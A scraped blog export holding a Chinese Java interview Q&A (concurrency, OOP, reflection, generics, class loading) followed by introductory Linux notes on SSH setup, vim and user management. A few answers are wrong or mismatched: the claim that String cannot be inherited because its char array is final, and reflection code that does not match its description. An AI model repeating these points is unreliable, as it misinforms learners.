volatile关键字是用来保证有序性和可见性的。这跟Java内存模型有关。比如我们所写的代码，不一定是按照我们自己书写的顺序来执行的，编译器会做重排序，CPU也会做重排序的，这样的重排序是为了减少流水线的阻塞的，引起流水阻塞，比如数据相关性，提高CPU的执行效率。需要有一定的顺序和规则来保证，不然程序员自己写的代码都不知带对不对了，所以有happens-before规则，其中有条就是volatile变量规则：对一个变量的写操作先行发生于后面对这个变量的读操作；有序性实现的是通过插入内存屏障来保证的。可见性：首先Java内存模型分为，主内存，工作内存。比如线程A从主内存把变量从主内存读到了自己的工作内存中，做了加1的操作，但是此时没有将i的最新值刷新会主内存中，线程B此时读到的还是i的旧值。加了volatile关键字的代码生成的汇编代码发现，会多出一个lock前缀指令。Lock指令对Intel平台的CPU，早期是锁总线，这样代价太高了，后面提出了缓存一致性协议，MESI，来保证了多核之间数据不一致性问题。 请你介绍一下Syncronized锁，如果用这个关键字修饰一个静态方法，锁住了什么？如果修饰成员方法，锁住了什么？ synchronized修饰静态方法以及同步代码块的synchronized (类.class)用法锁的是类，线程想要执行对应同步代码，需要获得类锁。synchronized修饰成员方法，线程获取的是当前调用该方法的对象实例的对象锁。 若对一个类不重写，它的equals()方法是如何比较的？ 比较是对象的地址。 请解释hashCode()和equals()方法有什么联系？Java对象的eqauls方法和hashCode方法是这样规定的： ➀ 相等（相同）的对象必须具有相等的哈希码（或者散列码）。 ➁ 如果两个对象的hashCode相同，它们并不一定相同。 什么是构造函数？什么是构造函数重载？什么是复制构造函数？ 当新对象被创建的时候，构造函数会被调用。每一个类都有构造函数。在程序员没有给类提供构造函数的情况下，Java编译器会为这个类创建一个默认的构造函数。Java中构造函数重载和方法重载很相似。可以为一个类创建多个构造函数。每一个构造函数必须有它自己唯一的参数列表。Java不支持像C++中那样的复制构造函数，这个不同点是因为如果你不自己写构造函数的情况下，Java不会创建默认的复制构造函数。 请说明Java中的方法覆盖(Overriding)和方法重载(Overloading)是什么意思？ Java中的方法重载发生在同一个类里面两个或者是多个方法的方法名相同但是参数不同的情况。 与此相对，方法覆盖是说子类重新定义了父类的方法。方法覆盖必须有相同的方法名，参数列表和返回类型。覆盖者可能不会限制它所覆盖的方法的访问。 Query接口的list方法和iterate方法有什么区别？ ① list()方法无法利用一级缓存和二级缓存（对缓存只写不读），它只能在开启查询缓存的前提下使用查询缓存；iterate()方法可以充分利用缓存，如果目标数据只读或者读取频繁，使用iterate()方法可以减少性能开销。② list()方法不会引起N+1查询问题，而iterate()方法可能引起N+1查询问题 面向对象的”六原则一法则”。 - 单一职责原则：一个类只做它该做的事情。（单一职责原则想表达的就是”高内聚”，写代码最终极的原则只有六个字”高内聚、低耦合”，所谓的高内聚就是一个代码模块只完成一项功能，在面向对象中，如果只让一个类完成它该做的事，而不涉及与它无关的领域就是践行了高内聚的原则，这个类就只有单一职责。另一个是模块化，好的自行车是组装车，从减震叉、刹车到变速器，所有的部件都是可以拆卸和重新组装的，好的乒乓球拍也不是成品拍，一定是底板和胶皮可以拆分和自行组装的，一个好的软件系统，它里面的每个功能模块也应该是可以轻易的拿到其他系统中使用的，这样才能实现软件复用的目标。）- 开闭原则：软件实体应当对扩展开放，对修改关闭。（在理想的状态下，当我们需要为一个软件系统增加新功能时，只需要从原来的系统派生出一些新类就可以，不需要修改原来的任何一行代码。要做到开闭有两个要点：①抽象是关键，一个系统中如果没有抽象类或接口系统就没有扩展点；②封装可变性，将系统中的各种可变因素封装到一个继承结构中，如果多个可变因素混杂在一起，系统将变得复杂而换乱，如果不清楚如何封装可变性，可以参考《设计模式精解》一书中对桥梁模式的讲解的章节。）- 依赖倒转原则：面向接口编程。（该原则说得直白和具体一些就是声明方法的参数类型、方法的返回类型、变量的引用类型时，尽可能使用抽象类型而不用具体类型，因为抽象类型可以被它的任何一个子类型所替代，请参考下面的里氏替换原则。）里氏替换原则：任何时候都可以用子类型替换掉父类型。（关于里氏替换原则的描述，Barbara Liskov女士的描述比这个要复杂得多，但简单的说就是能用父类型的地方就一定能使用子类型。里氏替换原则可以检查继承关系是否合理，如果一个继承关系违背了里氏替换原则，那么这个继承关系一定是错误的，需要对代码进行重构。例如让猫继承狗，或者狗继承猫，又或者让正方形继承长方形都是错误的继承关系，因为你很容易找到违反里氏替换原则的场景。需要注意的是：子类一定是增加父类的能力而不是减少父类的能力，因为子类比父类的能力更多，把能力多的对象当成能力少的对象来用当然没有任何问题。）- 接口隔离原则：接口要小而专，绝不能大而全。（臃肿的接口是对接口的污染，既然接口表示能力，那么一个接口只应该描述一种能力，接口也应该是高度内聚的。例如，琴棋书画就应该分别设计为四个接口，而不应设计成一个接口中的四个方法，因为如果设计成一个接口中的四个方法，那么这个接口很难用，毕竟琴棋书画四样都精通的人还是少数，而如果设计成四个接口，会几项就实现几个接口，这样的话每个接口被复用的可能性是很高的。Java中的接口代表能力、代表约定、代表角色，能否正确的使用接口一定是编程水平高低的重要标识。）- 合成聚合复用原则：优先使用聚合或合成关系复用代码。（通过继承来复用代码是面向对象程序设计中被滥用得最多的东西，因为所有的教科书都无一例外的对继承进行了鼓吹从而误导了初学者，类与类之间简单的说有三种关系，Is-A关系、Has-A关系、Use-A关系，分别代表继承、关联和依赖。其中，关联关系根据其关联的强度又可以进一步划分为关联、聚合和合成，但说白了都是Has-A关系，合成聚合复用原则想表达的是优先考虑Has-A关系而不是Is-A关系复用代码，原因嘛可以自己从百度上找到一万个理由，需要说明的是，即使在Java的API中也有不少滥用继承的例子，例如Properties类继承了Hashtable类，Stack类继承了Vector类，这些继承明显就是错误的，更好的做法是在Properties类中放置一个Hashtable类型的成员并且将其键和值都设置为字符串来存储数据，而Stack类的设计也应该是在Stack类中放一个Vector对象来存储数据。记住：任何时候都不要继承工具类，工具是可以拥有并可以使用的，而不是拿来继承的。）- 迪米特法则：迪米特法则又叫最少知识原则，一个对象应当对其他对象有尽可能少的了解。再复杂的系统都可以为用户提供一个简单的门面，Java Web开发中作为前端控制器的Servlet或Filter不就是一个门面吗，浏览器对服务器的运作方式一无所知，但是通过前端控制器就能够根据你的请求得到相应的服务。调停者模式也可以举一个简单的例子来说明，例如一台计算机，CPU、内存、硬盘、显卡、声卡各种设备需要相互配合才能很好的工作，但是如果这些东西都直接连接到一起，计算机的布线将异常复杂，在这种情况下，主板作为一个调停者的身份出现，它将各个设备连接在一起而不需要每个设备之间直接交换数据，这样就减小了系统的耦合度和复杂度。 如何通过反射获取和设置对象私有字段的值？ 可以通过类对象的getDeclaredField()方法字段（Field）对象，然后再通过字段对象的setAccessible(true)将其设置为可以访问，接下来就可以通过get/set方法来获取/设置字段的值了。 下面的代码实现了一个反射的工具类，其中的两个静态方法分别用于获取和设置私有字段的值，字段可以是基本类型也可以是对象类型且支持多级对象操作，例如ReflectionUtil.get(dog, “owner.car.engine.id”);可以获得dog对象的主人的汽车的引擎的ID号。 12345678import java.lang.reflect.Method;class MethodInvokeTest &#123; public static void main(String[] args) throws Exception &#123; String str = \"hello\"; Method m = str.getClass().getMethod(\"toUpperCase\"); System.out.println(m.invoke(str)); // HELLO &#125;&#125; 请说明重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？ 方法的重载和重写都是实现多态的方式， 区别在于前者实现的是编译时的多态性，而后者实现的是运行时的多态性。 重载发生在一个类中，同名的方法如果有不同的参数列表（参数类型不同、参数个数不同或者二者都不同）则视为重载；重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的返回类型，比父类被重写方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则）。重载对返回类型没有特殊的要求。 两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，该说法是否正确，为什么？ 不对，如果两个对象x和y满足x.equals(y) == true，它们的哈希码（hash code）应当相同。Java对于eqauls方法和hashCode方法是这样规定的： (1)如果两个对象相同（equals方法返回true），那么它们的hashCode值一定要相同； (2)如果两个对象的hashCode相同，它们并不一定相同。 当然，你未必要按照要求去做，但是如果你违背了上述原则就会发现在使用容器时，相同的对象可以出现在Set集合中，同时增加新元素的效率会大大下降（对于使用哈希存储的系统，如果哈希码频繁的冲突将会造成存取性能急剧下降）。 请说明内部类可以引用他包含类的成员吗，如果可以，有没有什么限制吗？ 一个内部类对象可以访问创建它的外部类对象的内容，内部类如果不是static的，那么它可以访问创建它的外部类对象的所有属性.内部类如果是sattic的，即为nested class，那么它只可以访问创建它的外部类对象的所有static属性一般普通类只有public或package的访问修饰，而内部类可以实现static，protected，private等访问修饰。当从外部类继承的时候，内部类是不会被覆盖的，它们是完全独立的实体，每个都在自己的命名空间内，如果从内部类中明确地继承，就可以覆盖原来内部类的方法。 请说明JAVA语言如何进行异常处理，关键字：throws,throw,try,catch,finally分别代表什么意义？在try块中可以抛出异常吗？ Java 通过面向对象的方法进行异常处理，把各种不同的异常进行分类，并提供了良好的接口。在Java中，每个异常都是一个对象，它是Throwable类或其它子类的实例。当一个方法出现异常后便抛出一个异常对象，该对象中包含有异常信息，调用这个对象的方法可以捕获到这个异常并进行处理。 Java的异常处理是通过5个关键词来实现的：try、catch、throw、throws和finally。一般情况下是用try来执行一段程序，如果出现异常，系统会抛出（throws）一个异常，这时候你可以通过它的类型来捕捉（catch）它，或最后（finally）由缺省处理器来处理。用try来指定一块预防所有”异常”的程序。紧跟在try程序后面，应包含一个catch子句来指定你想要捕捉的”异常”的类型。throw语句用来明确地抛出一个”异常”。throws用来标明一个成员函数可能抛出的各种”异常”。Finally为确保一段代码不管发生什么”异常”都被执行一段代码。可以在一个成员函数调用的外面写一个try语句，在这个成员函数内部写另一个try语句保护其他代码。每当遇到一个try语句，”异常“的框架就放到堆栈上面，直到所有的try语句都完成。如果下一级的try语句没有对某种”异常”进行处理，堆栈就会展开，直到遇到有处理这种”异常”的try语句。 请说明Java的接口和C++的虚类的相同和不同处 由于Java不支持多继承，而有可能某个类或对象要使用分别在几个类或对象里面的方法或属性，现有的单继承机制就不能满足要求。与继承相比，接口有更高的灵活性，因为接口中没有任何实现代码。当一个类实现了接口以后，该类要实现接口里面所有的方法和属性，并且接口里面的属性在默认状态下面都是public static,所有方法默认情况下是public.一个类可以实现多个接口。 当一个对象被当作参数传递给一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递? 是值传递。Java 编程语言只有值传递参数。当一个对象实例作为一个参数被传递到方法中时，参数的值就是对该对象的引用。对象的内容可以在被调用的方法中改变，但对象的引用是永远不会改变的。 请你说说Static Nested Class 和 Inner Class的不同 Static Nested Class是被声明为静态（static）的内部类，它可以不依赖于外部类实例被实例化。而通常的内部类需要在外部类实例化后才能实例化。Static-Nested Class 的成员, 既可以定义为静态的(static), 也可以定义为动态的(instance).Nested Class的静态成员(Method)只能对Outer Class的静态成员(static memebr)进行操作(ACCESS), 而不能Access Outer Class的动态成员(instance member).而 Nested Class的动态成员(instance method) 却可以 Access Outer Class的所有成员, 这个概念很重要, 许多人对这个概念模糊. 有一个普通的原则, 因为静态方法(static method) 总是跟 CLASS 相关联(bind CLASS), 而动态方法( (instance method) 总是跟 instance object 相关联, 所以,静态方法(static method)永远不可以Access跟 object 相关的动态成员(instance member),反过来就可以, 一个CLASS的 instance object 可以 Access 这个 Class 的任何成员, 包括静态成员(static member). 请你讲讲abstract class和interface有什么区别?声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。Abstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类为。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。 接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。接口只可以定义static final成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到接口类型或从接口类型转换，instanceof 运算符可以用来决定某对象的类是否实现了接口。 请说明Overload和Override的区别，Overloaded的方法是否可以改变返回值的类型? 方法的重写Overriding和重载Overloading是Java多态性的不同表现。重写Overriding是父类与子类之间多态性的一种表现，重载Overloading是一个类中多态性的一种表现。如果在子类中定义某方法与其父类有相同的名称和参数，我们说该方法被重写(Overriding)。子类的对象使用这个方法时，将调用子类中的定义，对它而言，父类中的定义如同被”屏蔽”了。如果在一个类中定义了多个同名的方法，它们或有不同的参数个数或有不同的参数类型，则称为方法的重载(Overloading)。Overloaded的方法是可以改变返回值的类型。 请说明一下final, finally, finalize的区别。final 用于声明属性，方法和类，分别表示属性不可变，方法不可覆盖，类不可继承。finally是异常处理语句结构的一部分，表示总是执行。finalize是Object类的一个方法，在垃圾收集器执行的时候会调用被回收对象的此方法，可以覆盖此方法提供垃圾收集时的其他资源回收，例如关闭文件等。 面向对象的特征有哪些方面抽象：抽象就是忽略一个主题中与当前目标无关的那些方面，以便更充分地注意与当前目标有关的方面。抽象并不打算了解全部问题，而只是选择其中的一部分，暂时不用部分细节。抽象包括两个方面，一是过程抽象，二是数据抽象。继承：继承是一种联结类的层次模型，并且允许和鼓励类的重用，它提供了一种明确表述共性的方法。对象的一个新类可以从现有的类中派生，这个过程称为类继承。新类继承了原始类的特性，新类称为原始类的派生类（子类），而原始类称为新类的基类（父类）。派生类可以从它的基类那里继承方法和实例变量，并且类可以修改或增加新的方法使之更适合特殊的需要。封装：封装是把过程和数据包围起来，对数据的访问只能通过已定义的界面。面向对象计算始于这个基本概念，即现实世界可以被描绘成一系列完全自治、封装的对象，这些对象通过一个受保护的接口访问其他对象。多态：多态性是指允许不同类的对象对同一消息作出响应。多态性包括参数化多态性和包含多态性。多态性语言具有灵活、抽象、行为共享、代码共享的优势，很好的解决了应用程序函数同名问题。 请说明Comparable和Comparator接口的作用以及它们的区别。 Java提供了只包含一个compareTo()方法的Comparable接口。这个方法可以个给两个对象排序。具体来说，它返回负数，0，正数来表明输入对象小于，等于，大于已经存在的对象。Java提供了包含compare()和equals()两个方法的Comparator接口。compare()方法用来给两个输入参数排序，返回负数，0，正数表明第一个参数是小于，等于，大于第二个参数。equals()方法需要一个对象作为参数，它用来决定输入参数是否和comparator相等。只有当输入参数也是一个comparator并且输入参数和当前comparator的排序结果是相同的时候，这个方法才返回true。 接口和抽象类的区别是什么？ Java提供和支持创建抽象类和接口。它们的实现有共同点，不同点在于：接口中所有的方法隐含的都是抽象的。而抽象类则可以同时包含抽象和非抽象的方法。类可以实现很多个接口，但是只能继承一个抽象类类可以不实现抽象类和接口声明的所有方法，当然，在这种情况下，类也必须得声明成是抽象的。抽象类可以在不提供接口方法实现的情况下实现接口。Java接口中声明的变量默认都是final的。抽象类可以包含非final的变量。Java接口中的成员函数默认是public的。抽象类的成员函数可以是private，protected或者是public。接口是绝对抽象的，不可以被实例化。抽象类也不可以被实例化，但是，如果它包含main方法的话是可以被调用的。也可以参考JDK8中抽象类和接口的区别 请说明Java是否支持多继承？ Java中类不支持多继承，只支持单继承（即一个类只有一个父类）。 但是java中的接口支持多继承，，即一个子接口可以有多个父接口。（接口的作用是用来扩展对象的功能，一个子接口继承多个父接口，说明子接口扩展了多个功能，当类实现接口时，类就扩展了相应的功能）。 如何通过反射创建对象？ 方法1：通过类对象调用newInstance()方法，例如：String.class.newInstance() 方法2：通过类对象的getConstructor()或getDeclaredConstructor()方法获得构造器（Constructor）对象并调用其newInstance()方法创建对象，例如：String.class.getConstructor(String.class).newInstance(“Hello”); 是否可以在static环境中访问非static变量？static变量在Java中是属于类的，它在所有的实例中的值是一样的。当类被Java虚拟机载入的时候，会对static变量进行初始化。如果你的代码尝试不用实例来访问非static的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。 extends 和super 泛型限定符（1）泛型中上界和下界的定义 上界&lt;? extend Fruit&gt; 下界&lt;? super Apple&gt; （2）上界和下界的特点 上界的list只能get，不能add（确切地说不能add出除null之外的对象，包括Object） 下界的list只能add，不能get （3）示例代码 12345678910111213141516171819202122232425import java.util.ArrayList;import java.util.List; class Fruit &#123;&#125;class Apple extends Fruit &#123;&#125;class Jonathan extends Apple &#123;&#125;class Orange extends Fruit &#123;&#125; public class CovariantArrays &#123; public static void main(String[] args) &#123; //上界 List&lt;? extends Fruit&gt; flistTop = new ArrayList&lt;Apple&gt;(); flistTop.add(null); //add Fruit对象会报错 //flist.add(new Fruit()); Fruit fruit1 = flistTop.get(0); //下界 List&lt;? super Apple&gt; flistBottem = new ArrayList&lt;Apple&gt;(); flistBottem.add(new Apple()); flistBottem.add(new Jonathan()); //get Apple对象会报错 //Apple apple = flistBottem.get(0); &#125;&#125; （4）上界&lt;? extend Fruit&gt; ，表示所有继承Fruit的子类，但是具体是哪个子类，无法确定，所以调用add的时候，要add什么类型，谁也不知道。但是get的时候，不管是什么子类，不管追溯多少辈，肯定有个父类是Fruit，所以，我都可以用最大的父类Fruit接着，也就是把所有的子类向上转型为Fruit。 下界&lt;? super Apple&gt;，表示Apple的所有父类，包括Fruit，一直可以追溯到老祖宗Object 。那么当我add的时候，我不能add Apple的父类，因为不能确定List里面存放的到底是哪个父类。但是我可以add Apple及其子类。因为不管我的子类是什么类型，它都可以向上转型为Apple及其所有的父类甚至转型为Object 。但是当我get的时候，Apple的父类这么多，我用什么接着呢，除了Object，其他的都接不住。 所以，归根结底可以用一句话表示，那就是编译器可以支持向上转型，但不支持向下转型。具体来讲，我可以把Apple对象赋值给Fruit的引用，但是如果把Fruit对象赋值给Apple的引用就必须得用cast。 什么是泛型？ 泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。 123456789101112131415161718192021public class GenericTest &#123; public static void main(String[] args) &#123; /* List list = new ArrayList(); list.add(\"qqyumidi\"); list.add(\"corn\"); list.add(100); */ List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add(\"qqyumidi\"); list.add(\"corn\"); //list.add(100); // 1 提示编译错误 for (int i = 0; i &lt; list.size(); i++) &#123; String name = list.get(i); // 2 System.out.println(\"name:\" + name); &#125; &#125; &#125; 采用泛型写法后，在//1处想加入一个Integer类型的对象时会出现编译错误，通过List，直接限定了list集合中只能含有String类型的元素，从而在//2处无须进行强制类型转换，因为此时，集合能够记住元素的类型信息，编译器已经能够确认它是String类型了。 静态变量存在什么位置方法区 解释类加载机制，双亲委派模型，好处是什么？某个特定的类加载器在接到加载类的请求时， 首先将加载任务委托给父类加载器，依次递归，如果父类加载器可以完成类加载任务，就成功返回；只有父类加载器无法完成此加载任务时，才自己去加载。 使用双亲委派模型的好处在于使用双亲委派模型的好处在于Java类随着它的类加载器一起具备了一种带有优先级的层次关系。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。 双亲委派机制的意义主要是保护一些基本类不受影响。比如常用的 String类， 其全限定名是 java.lang.String， 只是 java.lang 这个包下的类在使用的时候，可以不用 import 而直接使用。像这种基本类 按照双亲委派机制 都应该从 rt.jar 里去获取，而不应该从自定义加载器里去获取某个开发人员自己写的 java.lang.String, 毕竟开发人员自己写的 java.lang.String 可能有很多 bug, 通过这种方式，无论如何大家使用的都是 rt.jar 里的 java.lang.String 类了。 请你谈谈StringBuffer和StringBuilder有什么区别，底层实现上呢？StringBuffer线程安全，StringBuilder线程不安全， 底层实现上的话，StringBuffer其实就是比StringBuilder多了Synchronized修饰符。 请说明String是否能能继承？ 不能，char数组用final修饰的。 说明”static”关键字是什么意思？Java中是否可以覆盖(override)一个private或者是static的方法？ “static”关键字表明一个成员变量或者是成员方法可以在没有所属的类的实例变量的情况下被访问。Java中static方法不能被覆盖，因为方法覆盖是基于运行时动态绑定的，而static方法是编译时静态绑定的。static方法跟类的任何实例都不相关，所以概念上不适用。 请说明重载和重写的区别，相同参数不同返回值能重载吗？重载(Overloading) （1） 方法重载是让类以统一的方式处理不同类型数据的一种手段。多个同名函数同时存在，具有不同的参数个数/类型。 重载Overloading是一个类中多态性的一种表现。 （2） Java的方法重载，就是在类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。 调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法, 这就是多态性。 （3） 重载的时候，方法名要一样，但是参数类型和个数不一样，返回值类型可以相同也可以不相同。无法以返回型别作为重载函数的区分标准。 重写（Overriding） （1） 父类与子类之间的多态性，对父类的函数进行重新定义。如果在子类中定义某方法与其父类有相同的名称和参数，我们说该方法被重写 (Overriding)。在Java中，子类可继承父类中的方法，而不需要重新编写相同的方法。 但有时子类并不想原封不动地继承父类的方法，而是想作一定的修改，这就需要采用方法的重写。 方法重写又称方法覆盖。 （2）若子类中的方法与父类中的某一方法具有相同的方法名、返回类型和参数表，则新方法将覆盖原有的方法。 如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。 （3）子类函数的访问修饰权限不能少于父类的。 请列举你所知道的Object类的方法并简要说明。Object()默认构造方法。 clone() 创建并返回此对象的一个副本。 equals(Object obj) 指示某个其他对象是否与此对象“相等”。 finalize()当垃圾回收器确定不存在对该对象的更多引用时，由对象的垃圾回收器调用此方法。 getClass()返回一个对象的运行时类。 hashCode()返回该对象的哈希码值。 notify()唤醒在此对象监视器上等待的单个线程。 notifyAll()唤醒在此对象监视器上等待的所有线程。 toString()返回该对象的字符串表示。 wait()导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法。 wait(long timeout)导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或者超过指定的时间量。 wait(long timeout, int nanos) 导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或者其他某个线程中断当前线程，或者已超过某个实际时间量。 类和对象的区别1.类是对某一类事物的描述，是抽象的；而对象是一个实实在在的个体，是类的一个实例。 比如：“人”是一个类，而“教师”则是“人”的一个实例。 2.对象是函数、变量的集合体；而类是一组函数和变量的集合体，即类是一组具有相同属性的对象集合体。 String为什么不可变？不可变对象是指一个对象的状态在对象被创建之后就不再变化。不可改变的意思就是说：不能改变对象内的成员变量，包括基本数据类型的值不能改变，引用类型的变量不能指向其他的对象，引用类型指向的对象的状态也不能改变。 String 不可变是因为在 JDK 中 String 类被声明为一个 final 类，且类内部的 value 字节数组也是 final 的，只有当字符串是不可变时字符串池才有可能实现，字符串池的实现可以在运行时节约很多 heap 空间，因为不同的字符串变量都指向池中的同一个字符串；如果字符串是可变的则会引起很严重的安全问题，譬如数据库的用户名密码都是以字符串的形式传入来获得数据库的连接，或者在 socket 编程中主机名和端口都是以字符串的形式传入，因为字符串是不可变的，所以它的值是不可改变的，否则黑客们可以钻到空子改变字符串指向的对象的值造成安全漏洞；因为字符串是不可变的，所以是多线程安全的，同一个字符串实例可以被多个线程共享，这样便不用因为线程安全问题而使用同步，字符串自己便是线程安全的；因为字符串是不可变的所以在它创建的时候 hashcode 就被缓存了，不变性也保证了 hash 码的唯一性，不需要重新计算，这就使得字符串很适合作为 Map 的键，字符串的处理速度要快过其它的键对象，这就是 HashMap 中的键往往都使用字符串的原因。 请讲讲Java有哪些特性，并举一个和多态有关的例子。 封装、继承、多态。多态：指允许不同类的对象对同一消息做出响应。即同一消息可以根据发送对象的不同而采用多种不同的行为方式。（发送消息就是函数调用） 请你讲讲wait方法的底层原理ObjectSynchronizer::wait方法通过object的对象中找到ObjectMonitor对象调用方法 void ObjectMonitor::wait(jlong millis, bool interruptible, TRAPS) 通过ObjectMonitor::AddWaiter调用把新建立的ObjectWaiter对象放入到 _WaitSet 的队列的末尾中然后在ObjectMonitor::exit释放锁，接着 thread_ParkEvent-&gt;park 也就是wait。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Linux","slug":"Linux","date":"2020-07-02T05:26:15.000Z","updated":"2021-04-11T17:11:28.299Z","comments":true,"path":"linux/","link":"","permalink":"https://kayleh.top/linux/","excerpt":"虚拟机","text":"虚拟机 下载中文支持 网络连接的三种形式 桥连接：Linux可以和其他系统通信，但是会造成IP冲突 NAT：网络地址转换方式，Linux可以访问外网，不会造成IP冲突 主机模式：你的Linux是一个独立的主机，不能访问外网 分区： boot分区：200M swap分区：交换分区，虚拟内存，没有挂载点，2048M 根分区/：使用全部剩余空间 安装VMTool复制到/opt下 tar -zxvf VM…… .tar.gz 解压,进去文件夹，执行 /vmware-install.pl 设置共享文件夹，在/mnt/hgfs下 Linux文件系统采用的是级层式的树状结构，最上层的是根目录“/”。 /bin 是Binary的缩写，这个目录存放着最经常使用的命令 /dev 管理设备 /etc管理配置文件 /home 存放普通用户的主目录，在Linux中每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib 系统开机需要 /media dvd相关 /mnt 挂载文件夹 /opt 安装的软件 /proc 内核 /root 系统管理员，超级权限者的用户主目录 /sbin Super user系统管理员使用的系统管理程序 /selinux 安全加强 /sys 系统 /tmp 临时文件 /usr 用户，安装的程序 /var 变量，日志 远程登陆XShell 需要Linux开启一个sshd服务22 终端打开setup，打开系统服务，找到sshd，空格键打开服务。tab键退出。 该服务会监听22端口。 ubuntu方法： 先试着开启SSH服务 在使用SSH之前，可以先检查SSH服务有没有开启。使用命令：sudo ps -e | grep ssh来查看，如果返回的结果是“xxxx? 00:00:00 sshd”,代表服务开启。那个四个x代表四位数字，每台机数字不一样的，如图： 如果没有反应或者其他结果，再试着开启SSH服务。使用命令sudo /etc/init.d/ssh start来开启服务，如图： 如果是图中结果，说明没有安装SSH服务，此时需要安装 SSH服务，为了能提高安装成功率，建议先更新源：sudo apt-get update更新安装源，如图： 然后安装SSH服务，使用命令：sudo apt-get install openssh-server。如图： 等待安装结束即可。然后再次查看服务有没有启动：sudo ps -e | grep ssh： 有sshd那个东西，说明服务启动了，如果需要再次确认或者没有图中的结果，使用命令来启动:sudo /etc/init.d/ssh start: 看到服务starting了，服务成功开启。另外，还有几条命令需要记住： sudo service ssh status 查看服务状态： sudo service ssh stop 关闭服务： sudo service ssh restart 重启服务 Xshell新建会话，先查看linux的ip地址。 1ipconfig 箭头指向的是ip地址。 填写到xshell Ubuntu需要配置sshd服务 输入Linux的用户名和密码。成功连接。 如果远程使用命令： 1reboot 服务器也会重启 文件的上传下载XFTP协议选择SFTP 端口号选择22 乱码解决： 选择要传输的文件，右键传输就可以了。 Vi和Vim编辑器 正常模式在正常模式下，我们可以使用快捷键。 以 vim 打开一个档案就直接进入一般模式了(这是默认的模式)。在这个模式中， 你可以使用『上下左右』按键来移动光标，你可以使用『删除字符』或『删除整行』来处理档案内容， 也可以使用『复制、贴上』来处理你的文件数据。 插入模式/编辑模式在模式下，程序员可以输入内容。 按下 i, I 等任何一个字母之后才会进入编辑模式, 一般来说按 i 即可 命令行模式在这个模式当中， 可以提供你相关指令，完成读取、存盘、替换、离开 vim 、显示行号等的动作则是在此模式中达成的！ 各模式之间的互相转换 快捷键的使用案例1) 拷贝当前行 yy , 拷贝当前行向下的 5 行 5yy，并粘贴（p）。 2) 删除当前行 dd , 删除当前行向下的 5 行 5dd 3) 在文件中查找某个单词 [命令行下 /关键字 ， 回车 查找 , 输入 n 就是查找下一个 ],查询 hello. 4) 设置文件的行号，取消文件的行号.[命令行下 : set nu 和 :set nonu] 5) 编辑 /etc/profile 文件，使用快捷键到底文档的最末行[G]和最首行[gg],注意这些都是在正常模式下执行的。 6) 在一个文件中输入 “hello” ,然后又撤销这个动作，再正常模式下输入 u 7) 编辑 /etc/profile 文件，并将光标移动到 第 20 行 shift+g 第一步：显示行号 :set nu 第二步：输入 20 这个数 第三步: 输入 shift+g 关机&amp;重启命令基本介绍shutdown shutdown -h now : 表示立即关机 shutdown -h 1 : 表示 1 分钟后关机 shutdown -r now: 立即重启 halt 就是直接使用，效果等价于关机 reboot 就是重启系统。 sync： 把内存的数据同步到磁盘 注意细节当我们关机或者重启时，都应该先执行以下 sync 指令，把内存的数据写入磁盘，防止数据丢失。 用户登录和注销1) 登录时尽量少用 root 帐号登录，因为它是系统管理员，最大的权限，避免操作失误。可以利用普通用户登录，登录后再用”su - 用户名’命令来切换成系统管理员身份. 2) 在提示符下输入 logout 即可注销用户 使用细节1)logout 注销指令在图形运行级别无效，在 运行级别 3 下有效. 用户管理 说明 Linux 系统是一个多用户多任务的操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号 添加用户基本语法useradd [选项] 用户名 1) 当创建用户成功后，会自动的创建和用户同名的家目录 2) 也可以通过 useradd -d 指定目录 新的用户名，给新创建的用户指定家目录 设置密码基本语法 passwd 用户名 删除用户基本语法userdel 用户名 1) 删除用户 xm，但是要保留家目录 1userdel xm 2) 删除用户 xh 以及用户主目录 1userdel xh -r 在删除用户时，我们一般不会将家目录删除。 查询用户信息基本语法12345id 用户名uid=0(root) gid=0(root) 组=0(root) | | | V V V用户id号 所在组的id号 组名 切换用户在操作 Linux 中，如果当前用户的权限不够，可以通过 su - 指令，切换到高权限用户，比如 root 基本语法 123su – 